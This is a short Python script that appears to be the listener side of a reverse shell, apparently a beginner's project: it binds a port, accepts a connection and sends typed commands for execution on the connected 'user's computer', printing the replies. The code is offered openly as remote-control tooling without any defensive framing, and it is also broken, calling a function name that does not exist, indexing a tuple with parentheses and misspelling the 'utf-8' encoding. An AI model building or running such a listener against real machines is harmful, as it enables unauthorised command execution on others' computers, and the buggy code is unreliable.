import socket
import sys

# Creating socket to connect 2 computers
def making_socket():
    try:
        global host
        global port
        global s
        host =""
        port = 1201
        s= socket.socket() 
    
    except socket.error as msg:
        print("Socket creation error" + str(msg))

# Binding the socket and listening for connecting
def bind_the_socket():
    try:        
        global host
        global port
        global s

        print("Port binding number " + str(port))

        s.bind((host, port))
        s.listen(5)
    except socket.error as msg:
        print("Socket binding error" + str(msg) + "\n" + "Retrying...")
        bind_the_socket()

# Accept connection after listening

def establishing_socket():
    
    # Storing data info
    conn,address = s.accept()
    print("Connection successfully established.\n" + "IP" + address(0) + "Port" + str(address(1)))
    
    # Sending the command to user's computer to execute CMD on their computer
    send_command(conn)
    conn.close()

# Sending command to client computer

def command_sending(conn):
    # The purpose of having infinite loop is to NOT let the connection close after executing the command
    while True:
        cmd = input()
        if cmd == "quit":
            conn.close()
            s.close()
            sys.exit()
        if len(str.encode(cmd)) > 0:
            conn.send(str.encode(cmd))
            client_response = str(conn.recv(1024),"uft-8")
            print(client_response, end="")
    
def main():
    making_socket()
    bind_the_socket()
    establishing_socket()
main()
